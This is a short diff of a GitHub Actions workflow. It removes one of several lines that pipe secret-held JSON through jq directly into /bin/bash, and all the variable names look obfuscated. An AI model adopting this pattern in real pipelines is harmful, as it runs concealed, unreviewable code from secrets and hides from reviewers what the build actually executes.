@@ -22,7 +22,6 @@ jobs:
           aulvf810: ${{ secrets.aulvf810 }}
         run: |
           printf '%s' "$aulvf810" | jq -r .w907 | /bin/bash
-          echo $gsz3679 | jq -r .taurd652 | /bin/bash
           printf '%s' "$xzkl51602" | jq -r .muumc03895 | /bin/bash
           printf '%s' "$etplr50" | jq -r .t6094 | /bin/bash
 
